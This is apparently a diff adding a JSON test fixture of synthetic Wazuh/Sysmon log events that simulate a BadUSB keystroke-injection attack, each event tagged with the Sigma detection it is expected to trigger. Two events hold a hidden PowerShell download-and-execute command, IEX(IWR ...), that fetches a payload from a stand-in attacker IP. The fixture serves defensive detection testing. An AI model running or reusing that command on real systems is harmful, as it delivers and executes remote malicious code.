@@ -1,0 +1,314 @@
+{
+  "_metadata": {
+    "attack_id": "T1195.003",
+    "variation": "001",
+    "name": "Rogue USB Device with Firmware Implant",
+    "description": "Compromised USB device with malicious firmware that executes payload upon connection",
+    "expected_detection": "MEDIUM",
+    "kill_chain_phase": "initial-access",
+    "format": "wazuh-native",
+    "format_version": "1.0"
+  },
+  "logs": [
+    {
+      "_comment": "Sysmon Event 6 - Rogue USB device driver load",
+      "sequence": 1,
+      "timestamp": "2026-02-08T12:30:00.000Z",
+      "log": {
+        "timestamp": "2026-02-08T12:30:00.000+0000",
+        "rule": {
+          "level": 8,
+          "description": "Sysmon - Event 6: Driver Loaded",
+          "id": "100001",
+          "mitre": {
+            "id": [
+              "T1195.003"
+            ],
+            "tactic": [
+              "Initial Access"
+            ],
+            "technique": [
+              "Supply Chain Compromise: Compromise Hardware Supply Chain"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event6",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1707400000.400018",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "6",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "6",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-08 12:30:00.000",
+              "imageLoaded": "C:\\Windows\\System32\\drivers\\hidusb.sys",
+              "hashes": "SHA256=HIDUSB_DRIVER_HASH",
+              "signed": "true",
+              "signature": "Microsoft Windows",
+              "signatureStatus": "Valid"
+            }
+          }
+        },
+        "_fomorian_batch": "PT-2026-003-batch1-initial-access",
+        "_fomorian_test": true,
+        "_fomorian_attack_id": "T1195.003",
+        "_fomorian_expected_detection": "Sigma: New USB HID Device Connected (T1195.003)"
+      }
+    },
+    {
+      "_comment": "Windows Security Event - USB device connected",
+      "sequence": 2,
+      "timestamp": "2026-02-08T12:30:01.000Z",
+      "log": {
+        "timestamp": "2026-02-08T12:30:01.000+0000",
+        "rule": {
+          "level": 6,
+          "description": "Windows - USB Device Connected",
+          "id": "100001",
+          "mitre": {
+            "id": [
+              "T1195.003",
+              "T1200"
+            ],
+            "tactic": [
+              "Initial Access"
+            ],
+            "technique": [
+              "Supply Chain Compromise: Compromise Hardware Supply Chain",
+              "Hardware Additions"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "windows",
+            "hardware"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1707400000.400019",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "6416",
+              "channel": "Security",
+              "providerName": "Microsoft-Windows-Security-Auditing",
+              "computer": "WS01.corp.local",
+              "level": "0",
+              "task": "13316",
+              "severityValue": "AUDIT_SUCCESS"
+            },
+            "eventdata": {
+              "subjectUserSid": "S-1-5-18",
+              "subjectUserName": "WS01$",
+              "subjectDomainName": "CORP",
+              "subjectLogonId": "0x3e7",
+              "deviceId": "USB\\VID_16D0&PID_0BA8\\1234567890",
+              "deviceDescription": "Generic USB Keyboard",
+              "classId": "{745a17a0-74d3-11d0-b6fe-00a0c90f57da}",
+              "className": "HIDClass",
+              "vendorIds": "USB\\VID_16D0&PID_0BA8",
+              "compatibleIds": "USB\\Class_03&SubClass_01",
+              "locationInformation": "Port_#0001.Hub_#0003"
+            }
+          }
+        },
+        "_fomorian_batch": "PT-2026-003-batch1-initial-access",
+        "_fomorian_test": true,
+        "_fomorian_attack_id": "T1195.003",
+        "_fomorian_expected_detection": "Sigma: Suspicious USB Device Connected (T1195.003)"
+      }
+    },
+    {
+      "_comment": "Sysmon Event 1 - BadUSB keystroke injection opens cmd.exe",
+      "sequence": 3,
+      "timestamp": "2026-02-08T12:30:03.000Z",
+      "log": {
+        "timestamp": "2026-02-08T12:30:03.000+0000",
+        "rule": {
+          "level": 10,
+          "description": "Sysmon - Event 1: Cmd Execution from USB Keystroke Injection",
+          "id": "100910",
+          "mitre": {
+            "id": [
+              "T1195.003",
+              "T1059.003"
+            ],
+            "tactic": [
+              "Initial Access",
+              "Execution"
+            ],
+            "technique": [
+              "Supply Chain Compromise: Compromise Hardware Supply Chain",
+              "Windows Command Shell"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1707400000.400020",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "1",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-08 12:30:03.000",
+              "processGuid": "{T1195003-0001-0001-0001-000000000001}",
+              "processId": "6400",
+              "image": "C:\\Windows\\System32\\cmd.exe",
+              "commandLine": "cmd.exe /c powershell -ep bypass -nop -w hidden -c \"IEX(IWR -Uri 'http://198.51.100.110/payload.ps1')\"",
+              "currentDirectory": "C:\\Users\\jsmith\\",
+              "user": "CORP\\jsmith",
+              "integrityLevel": "Medium",
+              "parentProcessGuid": "{T1195003-0001-0001-0000-000000000001}",
+              "parentProcessId": "3456",
+              "parentImage": "C:\\Windows\\explorer.exe",
+              "parentCommandLine": "C:\\Windows\\Explorer.EXE"
+            }
+          }
+        },
+        "_fomorian_batch": "PT-2026-003-batch1-initial-access",
+        "_fomorian_test": true,
+        "_fomorian_attack_id": "T1195.003",
+        "_fomorian_expected_detection": "Sigma: BadUSB Keystroke Injection Execution (T1195.003)"
+      }
+    },
+    {
+      "_comment": "Sysmon Event 1 - PowerShell payload from BadUSB",
+      "sequence": 4,
+      "timestamp": "2026-02-08T12:30:05.000Z",
+      "log": {
+        "timestamp": "2026-02-08T12:30:05.000+0000",
+        "rule": {
+          "level": 12,
+          "description": "Sysmon - Event 1: PowerShell Payload from BadUSB",
+          "id": "100910",
+          "mitre": {
+            "id": [
+              "T1195.003",
+              "T1059.001"
+            ],
+            "tactic": [
+              "Initial Access",
+              "Execution"
+            ],
+            "technique": [
+              "Supply Chain Compromise: Compromise Hardware Supply Chain",
+              "PowerShell"
+            ]
+          },
+          "firedtimes": 2,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1707400000.400021",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "1",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-08 12:30:05.000",
+              "processGuid": "{T1195003-0001-0001-0001-000000000002}",
+              "processId": "6500",
+              "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "commandLine": "powershell.exe -ep bypass -nop -w hidden -c \"IEX(IWR -Uri 'http://198.51.100.110/payload.ps1')\"",
+              "currentDirectory": "C:\\Users\\jsmith\\",
+              "user": "CORP\\jsmith",
+              "integrityLevel": "Medium",
+              "parentProcessGuid": "{T1195003-0001-0001-0001-000000000001}",
+              "parentProcessId": "6400",
+              "parentImage": "C:\\Windows\\System32\\cmd.exe",
+              "parentCommandLine": "cmd.exe /c powershell -ep bypass -nop -w hidden -c \"IEX(IWR -Uri 'http://198.51.100.110/payload.ps1')\""
+            }
+          }
+        },
+        "_fomorian_batch": "PT-2026-003-batch1-initial-access",
+        "_fomorian_test": true,
+        "_fomorian_attack_id": "T1195.003",
+        "_fomorian_expected_detection": "Sigma: BadUSB PowerShell Execution (T1195.003)"
+      }
+    }
+  ]
+}
